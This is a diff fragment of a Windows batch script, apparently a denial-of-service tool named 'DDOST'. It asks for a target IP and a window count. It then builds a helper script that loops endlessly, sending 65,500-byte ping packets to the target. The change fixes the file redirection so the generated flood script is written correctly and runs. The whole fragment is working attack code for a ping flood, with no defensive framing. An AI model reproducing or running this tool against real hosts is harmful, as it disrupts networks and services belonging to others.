@@ -16,11 +16,11 @@ if exist %userprofile%\key goto skip
       echo Amount of windows:
   set /p windows=
     cls
-      echo @echo off>"%temp%\DDOST\run.bat"
-      echo :loop>"%temp%\DDOST\run.bat"
-      echo if exist "%userprofile%\.ddost\data\exit.dat" exit>"%temp%\DDOST\run.bat"
-      echo ping %ip% -n 1 -l 65500>"%temp%\DDOST\run.bat"
-      echo goto loop>"%temp%\DDOST\run.bat"
+      echo @echo off>>"%temp%\DDOST\run.bat"
+      echo :loop>>"%temp%\DDOST\run.bat"
+      echo if exist "%userprofile%\.ddost\data\exit.dat" exit>>"%temp%\DDOST\run.bat"
+      echo ping %ip% -n 1 -l 65500>>"%temp%\DDOST\run.bat"
+      echo goto loop>>"%temp%\DDOST\run.bat"
       echo Minimize Windows (Y/N):
   set /p mintf=
     cls
